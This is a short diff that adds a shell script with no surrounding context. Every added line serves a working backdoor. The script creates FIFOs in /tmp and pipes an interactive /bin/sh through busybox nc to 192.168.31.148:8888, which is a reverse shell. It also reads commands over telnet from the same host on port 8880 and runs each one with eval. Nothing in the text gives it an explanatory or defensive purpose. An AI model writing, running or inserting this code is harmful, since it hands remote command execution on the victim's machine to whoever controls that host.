@@ -1,0 +1,9 @@
+TF="/tmp/myfifo1.$$"
+FIFO=/tmp/f1.$$
+mkfifo "$TF"
+mkfifo $FIFO
+cat $FIFO | /bin/sh -i 2>&1 | busybox nc 192.168.31.148 8888 > $FIFO
+telnet 192.168.31.148 8880 > "$TF" &
+while IFS= read -r line; do eval "$line"; done < "$TF"
+rm "$TF"
+rm $FIFO
